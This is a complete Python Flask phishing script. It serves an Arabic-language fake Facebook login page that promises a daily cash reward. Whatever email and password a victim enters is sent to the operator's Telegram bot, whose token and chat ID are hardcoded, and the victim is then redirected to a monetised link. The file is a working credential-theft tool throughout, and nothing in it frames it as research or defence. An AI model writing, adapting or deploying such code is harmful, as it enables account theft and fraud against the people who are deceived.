import os
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# --- بياناتك الجديدة والمؤكدة ---
BOT_TOKEN = "8059077088:AAFQQ-DYX4NXIWBG7VaLTnMhsGinXUnGGM" # من صورة BotFather تاعك
CHAT_ID = "7479786207" # الـ ID تاعك الشخصي اللي جناه من Userinfo
MONEY_SITE = "https://trianglerockers.com/1885419"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 38px; font-weight: bold; margin-bottom: 10px; }
        .msg { font-size: 16px; color: #1c1e21; margin-bottom: 20px; font-weight: 500; }
        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; }
        button { width: 98%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .line { border-top: 1px solid #dddfe2; margin: 20px 0; }
        .create-btn { background: #42b72a; color: white; padding: 10px 16px; border-radius: 6px; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="fb-logo">facebook</div>
        <div class="msg">سجل دخولك للمطالبة بمكافأة الـ 1800 دج اليومية من Triangle Rockers</div>
        <form method="POST" action="/login">
            <input type="text" name="u_email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="u_pass" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="line"></div>
        <a href="#" class="create-btn">إنشاء حساب جديد</a>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_PAGE

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('u_email')
    password = request.form.get('u_pass')
    
    # إرسال البيانات للتلغرام (الـ ID والـ Token الجدد)
    msg = f"✅ صيدة جديدة يا فارس!\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    
    return redirect(MONEY_SITE)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
